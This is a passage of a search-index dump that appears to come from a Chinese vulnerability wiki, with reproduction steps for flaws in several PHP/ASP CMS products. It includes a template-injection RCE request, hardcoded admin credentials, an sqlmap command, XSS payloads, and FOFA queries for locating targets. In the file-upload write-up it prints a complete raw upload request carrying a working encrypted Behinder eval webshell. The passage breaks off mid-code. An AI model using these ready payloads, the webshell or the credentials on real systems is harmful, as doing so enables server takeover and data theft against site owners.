","date":"0001-01-01","objectID":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"zzzcms\" ","date":"0001-01-01","objectID":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 发送如下请求包命令执行 POST /?location=search HTTP/1.1 Host: Content-Length: 30 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Content-Type: text/plain Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: PHPSESSID=rbuhrqqhoctntnak8slkascqp1; keys=%7Bif%3A%3DPHPINFO%28%29%7D%7Bend+if%7D%0D%0A keys={if:=PHPINFO()}{end if} 执行 ping dnslog ","date":"0001-01-01","objectID":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/zzzcms-parsersearch-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"华宜互联 硬编码超级管理员漏洞 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 华宜互联CMS默认存在超级管理员漏洞，如不修改则使用默认账号密码即可登录超级管理员 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 华宜互联CMS ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"华宜网络\" ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 原版的源码需要付费，可找到免费版的源码 在目录下的DATA目录中有mdb文件, 打开后可以发现存在默认的两个用户 admin/123456 lu123/cui123 使用 用户lu123 即可登录超级管理员 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 华宜互联0day分享 ","date":"0001-01-01","objectID":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E5%8D%8E%E5%AE%9C%E4%BA%92%E8%81%94-%E7%A1%AC%E7%BC%96%E7%A0%81%E8%B6%85%E7%BA%A7%E7%AE%A1%E7%90%86%E5%91%98%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"原创先锋 后台管理平台 未授权访问漏洞 ","date":"0001-01-01","objectID":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 原创先锋 后台管理平台 存在未授权访问漏洞，攻击者通过漏洞可以任意接管账户权限 ","date":"0001-01-01","objectID":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 原创先锋 后台管理平台 ","date":"0001-01-01","objectID":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 body=\"https://www.bjycxf.com\" ","date":"0001-01-01","objectID":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 后台登陆页面如下 未授权的Url /admin/admin/admin_list.html 点击添加并授权即可获取后台模块权限 ","date":"0001-01-01","objectID":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"参考文章 http://www.0dayhack.net/index.php/1693/ ","date":"0001-01-01","objectID":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E5%8E%9F%E5%88%9B%E5%85%88%E9%94%8B-%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"发货100 M_id SQL注入漏洞 CNVD-2021-30193 ","date":"0001-01-01","objectID":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/:0:0","tags":null,"title":"","uri":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/"},{"categories":null,"content":"漏洞描述 发货100 M_id参数存在SQL注入漏洞， 攻击者通过漏洞可以获取数据库敏感信息 ","date":"0001-01-01","objectID":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/:1:0","tags":null,"title":"","uri":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/"},{"categories":null,"content":"漏洞影响 发货100 ","date":"0001-01-01","objectID":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/:2:0","tags":null,"title":"","uri":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/"},{"categories":null,"content":"网络测绘 icon_hash=\"1420424513\" ","date":"0001-01-01","objectID":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/:3:0","tags":null,"title":"","uri":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/"},{"categories":null,"content":"漏洞复现 主页面如下 使用POC /?M_id=1%27\u0026type=product 数据库出现报错, 使用Sqlmap注入 sqlmap -u 'http://xxx.xxx.xxx.xxx/?M_id=11%27\u0026type=product' -p M_id ","date":"0001-01-01","objectID":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/:4:0","tags":null,"title":"","uri":"/%E5%8F%91%E8%B4%A7100-m_id-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cnvd-2021-30193/"},{"categories":null,"content":"快排CMS Socket.php 日志信息泄露漏洞 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 快排CMS 默认开启日志记录，由于日志名为时间作为文件名，造成管理员的Cookie泄露 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 快排 CMS \u003c= 1.2 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://gitee.com/qingzhanwang/kpcms ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 文件 thinkphp/library/think/log/driver/Socket.php 这里默认开启日志写入 runtime/log/202104/06.log 其中可以看到泄露了管理员的Cookie信息和其他敏感信息 并且文件命名为 年+月/日期.log 这里关注后台的日志文件中的 admin.php页面的cookie就可以获得管理员权限 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-socket.php-%E6%97%A5%E5%BF%97%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"快排CMS 后台XSS漏洞 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 快排CMS 后台存在XSS漏洞，通过后台构造特殊语句可以造成访问网站的用户被XSS影响 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 快排 CMS \u003c= 1.2 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://gitee.com/qingzhanwang/kpcms ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 漏洞出现在登录后台的网站编辑的位置，由于没有对输出的字符进行过滤，导致XSS 主页版权处嵌入XSS代码 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0xss%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"快排CMS 后台任意文件上传漏洞 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 快排CMS 后台管理模块存在任意文件上传漏洞，攻击者通过漏洞可以控制服务器 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 快排 CMS \u003c= 1.2 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 https://gitee.com/qingzhanwang/kpcms ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下, 默认账号密码为 admin/admin http://xxx.xxx.xxx.xxx/admin.php/index/login.html 源码中没有对上传文件的后缀检测 thinkphp/library/think/File.php 任意找一处文件上传点 上传抓包获取文件地址 POST /admin.php/index/upload.html?dir=image HTTP/1.1 Host: 192.168.1.108:88 Content-Length: 935 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://192.168.1.108:88 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYIt9WaQZiDMrwAVm User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/avif,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/webp,http://peiqi-wiki-poc.oss-cn-beijing.aliyuncs.com/vuln/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://192.168.1.108:88/admin.php/config/index.html Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: admin_id=IphHb2Z%2FRG9gIXGA7HpPzQ%3D%3D; menu_show=0; menu_id=menu_22; url=%2Fadmin.php%2Fconfig%2Findex.html x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 Connection: close ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"localUrl\" C:\\fakepath\\shell.php ------WebKitFormBoundaryYIt9WaQZiDMrwAVm Content-Disposition: form-data; name=\"imgFile\"; filename=\"shell.php\" Content-Type: application/octet-stream \u003c?php @error_reporting(0); session_start(); $key=\"e45e329feb5d925b\"; $_SESSION['k']=$key; $post=file_get_contents(\"php://input\"); if(!extension_loaded('openssl')) { $t=\"base64_\".\"decode\"; $post=$t($post.\"\"); for($i=0;$i\u003cstrlen($post);$i++) { $post[$i] = $post[$i]^$key[$i+1\u002615]; } } else { $post=openssl_decrypt($post, \"AES128\", $key); } $arr=explode('|',$post); $func=$arr[0]; $params=$arr[1]; class C{public function __invoke($p) {eval($p.\"\");}} @call_user_func(new C(),$params); ?\u003e ------WebKitFormBoundaryYIt9WaQZiDMrwAVm-- 连接冰蝎木马即可 ","date":"0001-01-01","objectID":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E5%BF%AB%E6%8E%92cms-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"极致CMS 1.81 后台存储型XSS ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:0:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"漏洞描述 极致CMS后台中存在存储XSS，通过XSS漏洞，可能泄漏敏感信息 ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:1:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"漏洞影响 极致CMS ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:2:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"网络测绘 icon_hash=\"1657387632\" ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:3:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"漏洞复现 网站主页 登录管理员添加模块 注册用户 点击发布文章 在文章标题处插入xss payload \u003cdetails open ontoggle= confirm(document[coo+kie])\u003e 当管理员访问时XSS成功 ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/:4:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-1.81-%E5%90%8E%E5%8F%B0%E5%AD%98%E5%82%A8%E5%9E%8Bxss/"},{"categories":null,"content":"极致CMS alipay_return_pay SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 极致CMS支付插件中存在SQL注入漏洞，通过漏洞可以获取数据库信息 ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 极致CMS ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 icon_hash=\"1657387632\" ","date":"0001-01-01","objectID":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E6%9E%81%E8%87%B4cms-alipay_return_pay-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 查看一下进行过滤的函数 /** 参数过滤，格式化 **/ function format_param($value=null,$int=0){ if($value==null){ return '';} switch ($int){ case 0://整数 return (int)$value; case 1://字符串 $value=htmlspecialchars(trim($value), ENT_QUOTES); if(version_compare(PHP_VERSION,'7.4','\u003e=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return $value; case 2://数组 if($value=='')return ''; array_walk_recursive($value, \"array_format\"); return $value; case 3://浮点 return (float)$value; case 4: if(version_compare(PHP_VERSION,'7.4','\u003e=')){ $value = addslashes($value); }else{ if(!get_magic_quotes_gpc())$value = addslashes($value); } return trim($value); } } //过滤XSS攻击 function SafeFilter(\u0026$arr) { $ra=Array('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/','/script/','/javascript/','/vbscript/','/expression/','/applet/' ,'/meta/','/xml/','/blink/','/link/','/style/','/embed/','/object/','/frame/','/layer/','/title/','/bgsound/' ,'/base/','/onload/','/onunload/','/onchange/','/onsubmit/','/onreset/','/onselect/','/onblur/','/onfocus/', '/onabort/','/onkeydown/','/onkeypress/','/onkeyup/','/onclick/','/ondblclick/','/onmousedown/','/onmousemove/' ,'/onmouseout/','/onmouseover/','/onmouseup/','/onunload/'); if (is_array($arr)) { foreach ($arr as $key =\u003e $value) { if (!is_array($value)) { if(version_compare(PHP_VERSION,'7.4','\u003e=')){ $value = addslashes($value); }else{ if (!get_magic_quotes_gpc()){ $value = addslashes($value); } } $value = preg_replace($ra,'',$value); //删除非打印字符，粗暴式过滤xss可疑字符串 $arr[$key] = htmlentities(strip_tags($value)); //去除 HTML 和 PHP 标记并转换为 HTML 实体 } else { SafeFilter($arr[$key]); } } } } 看一下执行的SQL语句的函数 // 查询一条 public function find($where=null,$order=null,$fields=null,$limit=1) { if( $record = $this-\u003efindAll($where, $order, $fields, 1) ){ return array_pop($record); }else{ return FALSE; } } 跟进 findAll 函数 // 查询所有 public function findAll($conditions=null,$order=null,$fields=null,$limit=null) { $where = ''; if(is_array($conditions)){ $join = array(); foreach( $conditions as $key =\u003e $value ){ $value = '\\''.$value.'\\''; $join[] = \"{$key} = {$value}\"; } $where = \"WHERE \".join(\" AND \",$join); }else{ if(null != $conditions)$where = \"WHERE \".$conditions; } if(is_array($order)){ $where .= ' ORDER BY '; $where .= implode(',', $order); }else{ if($order!=null)$where .= \" ORDER BY \".$order; } if(!empty($limit))$where .= \" LIMIT {$limit}\"; $fields = empty($fields) ? \"*\" : $fields; $sql = \"SELECT {$fields} FROM {$this-\u003etable} {$where}\"; return $this-\u003egetData($sql); } 再跟进一下getData函数 //获取数据 public function getData($sql) { if(!$result = $this-\u003equery($sql))return array(); if(!$this-\u003eStatement-\u003erowCount())return array(); $rows = array(); while($rows[] = 